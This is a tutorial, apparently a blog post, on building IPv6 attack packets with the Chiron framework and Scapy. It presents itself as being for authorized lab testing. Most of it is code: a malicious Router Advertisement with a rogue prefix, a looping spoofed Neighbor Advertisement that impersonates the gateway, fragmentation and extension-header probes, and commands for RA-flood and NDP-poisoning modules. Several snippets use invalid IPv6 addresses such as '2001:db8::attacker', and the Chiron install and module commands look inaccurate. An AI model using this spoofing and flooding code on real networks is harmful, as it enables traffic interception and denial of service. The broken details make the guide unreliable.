# How to Use Chiron Framework for IPv6 Attack Packet Construction

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Chiron, IPv6, Packet Construction, Security Testing, Scapy, Python

Description: A guide to using the Chiron IPv6 security assessment framework for constructing and sending custom IPv6 attack packets in authorized lab environments.

Chiron is a Python-based IPv6 security assessment framework built on top of Scapy. It provides a high-level interface for constructing complex IPv6 packets with various extension headers, enabling security researchers to test IPv6 implementations for vulnerabilities. Like all security tools, it must only be used in authorized environments.

**Warning**: Only use in isolated lab environments with explicit authorization.

## Installing Chiron

```bash
# Install dependencies
sudo apt-get install python3 python3-pip scapy

# Install Chiron
pip3 install chiron

# Or from source
git clone https://github.com/aatlasis/Chiron.git
cd Chiron
sudo python3 setup.py install
```

## Chiron vs Scapy Direct

Chiron builds on Scapy to provide IPv6-specific higher-level abstractions:

| Feature | Chiron | Raw Scapy |
|---|---|---|
| IPv6 extension header chaining | Simplified API | Manual construction |
| NDP packet templates | Built-in | Build from scratch |
| Attack scenario presets | Available | Write custom code |
| IPv6 fragmentation | Simplified | Complex |

## Basic Packet Construction with Chiron

Chiron uses Python with Scapy extensions. Key layers used:

```python
from scapy.all import *
from scapy.layers.inet6 import *

# Basic IPv6 ICMPv6 Echo Request
pkt = IPv6(src="2001:db8::attacker", dst="2001:db8::target") / ICMPv6EchoRequest()
send(pkt, iface="eth0")

# IPv6 with Hop-by-Hop extension header
pkt = IPv6(dst="2001:db8::target") / \
      IPv6ExtHdrHopByHop() / \
      ICMPv6EchoRequest()
send(pkt, iface="eth0")
```

## Constructing Router Advertisement Packets

```python
from scapy.all import *
from scapy.layers.inet6 import *

# Craft a malicious Router Advertisement
ra = Ether(src="aa:bb:cc:dd:ee:ff") / \
     IPv6(src="fe80::attacker", dst="ff02::1") / \
     ICMPv6ND_RA(
         chlim=64,
         prf=0,     # Default router preference
         routerlifetime=65535
     ) / \
     ICMPv6NDOptPrefixInfo(
         prefixlen=64,
         L=1, A=1,  # On-link + SLAAC
         prefix="2001:db8:attacker::"
     )

sendp(ra, iface="eth0")
```

## Constructing Neighbor Advertisement (NDP Spoofing)

```python
# Spoof Neighbor Advertisement to redirect traffic
na = Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff") / \
     IPv6(src="2001:db8::gateway", dst="ff02::1") / \
     ICMPv6ND_NA(
         tgt="2001:db8::gateway",
         R=1, S=0, O=1   # Router, not solicited, override
     ) / \
     ICMPv6NDOptDstLLAddr(lladdr="aa:bb:cc:dd:ee:ff")

sendp(na, iface="eth0", loop=1, inter=2)
```

## Constructing Fragmented Packets

```python
# Create a fragmented IPv6 packet
original = IPv6(dst="2001:db8::target") / \
           UDP(sport=12345, dport=53) / \
           ("X" * 2000)

# Fragment at 500 bytes
frags = fragment6(original, 500)

for frag in frags:
    send(frag, iface="eth0")
```

## Extension Header Chaining

```python
# Multiple extension headers (tests parser robustness)
pkt = IPv6(dst="2001:db8::target") / \
      IPv6ExtHdrHopByHop() / \
      IPv6ExtHdrDestOpt() / \
      IPv6ExtHdrRouting() / \
      TCP(dport=80)

send(pkt, iface="eth0")
```

## Chiron's Attack Modules

Chiron provides prebuilt attack scenarios:

```bash
# List available Chiron modules
python3 chiron.py --list-modules

# Run RA flooding module
python3 chiron.py --module ra_flood --interface eth0

# Run NDP cache poisoning module
python3 chiron.py --module ndp_poison --interface eth0 \
  --target 2001:db8::victim --spoof 2001:db8::gateway
```

## Capturing and Analyzing Results

```bash
# Capture traffic while running Chiron tests
sudo tcpdump -i eth0 -w chiron-test.pcap ip6

# Analyze in Wireshark
wireshark chiron-test.pcap
```

Chiron's Python foundation makes it easy to extend and customize packet construction for any IPv6 attack scenario, making it a valuable platform for comprehensive IPv6 security assessments in authorized lab environments.
